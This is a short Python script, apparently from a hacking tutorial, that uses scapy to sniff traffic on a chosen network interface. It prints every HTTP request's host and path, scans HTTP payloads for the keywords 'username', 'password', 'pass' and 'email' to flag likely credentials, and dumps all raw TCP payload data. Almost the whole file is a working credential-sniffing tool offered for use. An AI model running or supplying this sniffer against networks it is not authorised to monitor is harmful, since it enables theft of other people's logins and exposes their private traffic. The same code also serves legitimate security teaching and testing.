import scapy.all as scapy
import argparse
from scapy.layers.http import HTTPRequest

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    if not arguments.interface:
        print("[-] Please specify an interface using -i <interface>")
        exit()
    return arguments.interface

def sniffer(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

    # HTTP Packets Sniffing
def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        print("[+] HTTP Request >> " + packet[HTTPRequest].Host.decode(errors="ignore") + packet[HTTPRequest].Path.decode(errors="ignore"))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible credentials found >> " + load)
                    break
    
    # TCP Packets Sniffing
    if packet.haslayer(scapy.TCP):
        if packet.haslayer(scapy.Raw):
            print(f"[+] TCP Data (Port {packet[scapy.TCP].sport} -> {packet[scapy.TCP].dport}) >> " + packet[scapy.Raw].load.decode(errors="ignore"))

    # Code Execution
iface = get_interface()
sniffer(iface)
